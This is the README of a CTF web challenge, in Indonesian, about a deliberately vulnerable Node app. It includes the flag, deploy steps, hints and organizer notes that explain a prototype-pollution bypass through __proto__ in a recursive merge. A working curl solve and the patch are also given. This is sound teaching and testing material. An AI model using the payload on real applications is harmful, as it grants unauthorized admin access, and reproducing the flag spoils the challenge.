# Report Vault

- Category: Web
- Difficulty: Hard
- Points: 400
- Flag: `Olivia26{report_vault_polluted_access}`
- Port internal: `8000`
- Author: CTF Unesa

## Deskripsi Peserta

Report Vault menyimpan preferensi export laporan untuk user internal. Akun tamu boleh menyimpan preference JSON sendiri, tetapi laporan private hanya bisa dibuka oleh user dengan admin export access.

Temukan flag di laporan private.

## Hint

Fitur preference menerima JSON nested yang fleksibel.

Perhatikan bagaimana recursive merge menangani key object yang punya perilaku khusus di JavaScript.

Pengecekan akses membaca property user secara langsung; property lookup JavaScript tidak selalu berhenti di object itu sendiri.

## File Soal

- `server.js`: aplikasi web vulnerable
- `Dockerfile`: container image untuk challenge
- `docker-compose.yml`: deployment sekali jalan
- `flag.txt`: flag yang disalin ke `/flag.txt` di container
- `solve.sh`: solver untuk verifikasi panitia
- `challenge.yml`: metadata untuk platform CTF
- `WRITEUP.md`: write-up, exploit path, dan evaluasi celah challenge

## Deploy Dengan Docker Compose

```bash
docker compose up --build -d
```

Challenge akan berjalan di:

```text
http://127.0.0.1:8003
```

Matikan challenge:

```bash
docker compose down
```

## Deploy Manual

```bash
docker build -t report-vault .
docker run --rm -p 8003:8000 report-vault
```

## Verifikasi

```bash
chmod +x solve.sh
./solve.sh http://127.0.0.1:8003
```

Output yang diharapkan memuat:

```text
Olivia26{report_vault_polluted_access}
```

## Organizer Notes

Fungsi `mergeDeep()` tidak memblokir key berbahaya seperti `__proto__`, sehingga request JSON dapat mencemari `Object.prototype`.

Endpoint private report mengecek:

```js
user.role === "admin" && user.canExportPrivate === true
```

Karena property lookup JavaScript juga membaca prototype chain, attacker bisa membuat semua object memiliki property tersebut.

Contoh solve:

```bash
curl -s -c jar.txt http://127.0.0.1:8003/ >/dev/null
curl -s -b jar.txt -c jar.txt \
  -H 'content-type: application/json' \
  -d '{"preferences":{"__proto__":{"role":"admin","canExportPrivate":true}}}' \
  http://127.0.0.1:8003/api/preferences
curl -s -b jar.txt http://127.0.0.1:8003/reports/private
```

Patch yang benar adalah menolak key `__proto__`, `constructor`, dan `prototype`, atau memakai merge library yang aman terhadap prototype pollution.
